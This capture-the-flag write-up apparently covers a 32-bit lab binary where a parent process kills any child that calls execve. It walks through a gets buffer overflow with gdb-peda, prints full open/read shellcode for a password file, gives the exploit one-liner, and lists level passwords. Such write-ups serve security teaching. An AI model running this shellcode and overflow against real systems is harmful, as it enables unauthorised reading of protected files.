# Level04 - 32 bits - Can't use execve

## Local script usage

Requirements:

- `gdb-peda`
- `getenv32`

You can setup requirements with the script: [scripts/installUtils.sh](../../scripts/installUtils.sh)

```shell
./scripts/installUtils.sh
./level04/Ressources/main.sh
```

## Passwords and token

|         |                                            |
| ------- | ------------------------------------------ |
| level04 | `kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf` |
| level05 | `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN` |

## Steps to resolve on VM

See our assembly interpretation in [source file](../source.c)

So first of all, we notice that we have a fork and then we execute `gets` wich is vulnerable. After trying a buffer overflow to execute a shellcode with `execve("/bin/sh")` the program terminates with the message `no exec() for you`.

Indeed after some reflexions, we notice that after the fork, the parent process doesn't allow the child process to execute `execve` command :
`execve` command called by child process sends a `SIGTRAP` signal, which lets the control back to the parent process who kills the child procress and stops the program.

So the exploit would be to give it something else than `execve("/bin/sh")` => why not trying a shellcode who read/open the file `/home/users/level05/.pass` ?

First the offset :

```shell
pattern create 200 input
run < <(cat /tmp/input)
  Invalid $PC address: 0x71414154
  Stopped reason: SIGSEGV
  0x71414154 in ?? ()

pattern search
  EIP+0 found at offset: 156
```

Then the shellcode exported in an environment variable :

```shell
export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'"`
```
So the SHELLCODE = 255 NOPs + shellcode to open/read + the path  
Now we need this env variable's address and will add 100 to be sure to land into the NOPs of the shellcode :

```shell
./getenv32 SHELLCODE ~/level04
0xffffd79b

(in gdb)
p /x 0xffffd7b9 + 100
$2 = 0xffffd7ff
```

And finally use the exploit :

```shell
(python -c 'print("A" * 156 + "\xff\xd7\xff\xff")') | ~/level04
  Give me some shellcode, k
  3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
  child is exiting...
```

## Sources

### ASM

- [What does the “rep stos” x86 assembly instruction sequence do?](https://stackoverflow.com/questions/3818856/what-does-the-rep-stos-x86-assembly-instruction-sequence-do)
- ['Open/Read + pathname' shellcode](http://shell-storm.org/shellcode/files/shellcode-73.php)
- [FR - Ecrivez votre premier shellcode en asm x86 ! (Exemple 2 : execve(/bin/sh))](https://zestedesavoir.com/articles/158/ecrivez-votre-premier-shellcode-en-asm-x86/#2-exemple-2-execve-bin-sh)

### C

- [PTRACE_TRACEME](http://manpagesfr.free.fr/man/man2/ptrace.2.html)
- [ret2libc](https://beta.hackndo.com/retour-a-la-libc/)

#### Questions

- [how does ptrace catch fork's system call?](https://stackoverflow.com/questions/20440118/how-does-ptrace-catch-forks-system-call)

#### Man

- [Man fork](https://linux.die.net/man/3/fork)
- [Man gets](https://linux.die.net/man/3/gets)
- [Man kill](https://linux.die.net/man/3/kill)
- [Man memset](https://linux.die.net/man/3/memset)
- [Man prctl](https://linux.die.net/man/2/prctl)
- [Man ptrace](https://linux.die.net/man/2/ptrace)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man wait](https://linux.die.net/man/2/wait)